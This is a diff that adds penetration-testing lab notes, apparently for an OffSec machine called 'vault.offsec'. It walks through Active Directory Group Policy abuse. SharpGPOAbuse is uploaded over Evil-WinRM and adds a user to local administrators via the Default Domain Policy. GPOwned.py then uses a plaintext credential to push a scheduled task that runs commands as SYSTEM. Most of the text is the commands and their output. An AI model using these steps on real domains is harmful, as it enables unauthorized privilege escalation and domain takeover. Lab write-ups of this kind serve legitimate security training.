@@ -311,3 +311,71 @@ https://www.thehacker.recipes/ad/movement/group-policies
 
 https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master
 
+*Evil-WinRM* PS C:\Users\anirudh\Documents> upload SharpGPOAbuse.exe
+
+PS C:\Users\anirudh\Documents> .\SharpGPOAbuse.exe  --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
+[+] Domain = vault.offsec
+[+] Domain Controller = DC.vault.offsec
+[+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec
+[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103
+[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
+[+] File exists: \\vault.offsec\SysVol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+[+] The GPO does not specify any group memberships.
+[+] versionNumber attribute changed successfully
+[+] The version number in GPT.ini was increased successfully.
+[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
+[+] Done!
+
+
+
+PS C:\Users\Administrator\Desktop> gpupdate /force
+Updating policy...
+
+
+
+Computer Policy update has completed successfully.
+
+User Policy update has completed successfully.
+
+PS C:\Users\Administrator\Desktop> net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+anirudh
+The command completed successfully.
+
+even if this user is in administrators group, but cannot use it to read proof.txt
+
+
+https://github.com/X-C3LL/GPOwned
+
+ python3 GPOwned.py -u anirudh -p 'SecureHM' -d vault.offsec -dc-ip 192.168.204.172 \
+  -gpoimmtask -gpcmachine \
+  -name '{31B2F340-016D-11D2-945F-00C04FB984F9}' \
+  -author "vault.offsec\Administrator" \
+  -taskname 'HealthCheck2' \
+  -taskdescription 'System Maintenance' \
+  -dstpath 'C:\Windows\System32\cmd.exe' \
+-taskargs '/c powershell -c whoami > C:\Users\anirudh\Documents\b.txt'
+		GPO Helper - @TheXC3LL
+		Modifications by - @Fabrizzio53
+
+
+[*] Connecting to LDAP service at 192.168.204.172
+[*] Requesting GPOs info from LDAP
+[*] Connecting to SMB service at 192.168.204.172
+[*] Reading \vault.offsec\policies\{31b2f340-016d-11d2-945f-00c04fb984f9}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml 
+[*] Writing \vault.offsec\policies\{31b2f340-016d-11d2-945f-00c04fb984f9}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
+[*] Updating gPCMachineExtensionNames
+[*] Requesting {31B2F340-016D-11D2-945F-00C04FB984F9} version and location from LDAP
+[*] Updating from version [7] to [8]
+[*] Reading \vault.offsec\policies\{31b2f340-016d-11d2-945f-00c04fb984f9}\gpt.ini 
+[*] Writing \vault.offsec\policies\{31b2f340-016d-11d2-945f-00c04fb984f9}\gpt.ini
+[+] Version updated succesfully!
+
+[^] Have a nice day!
+
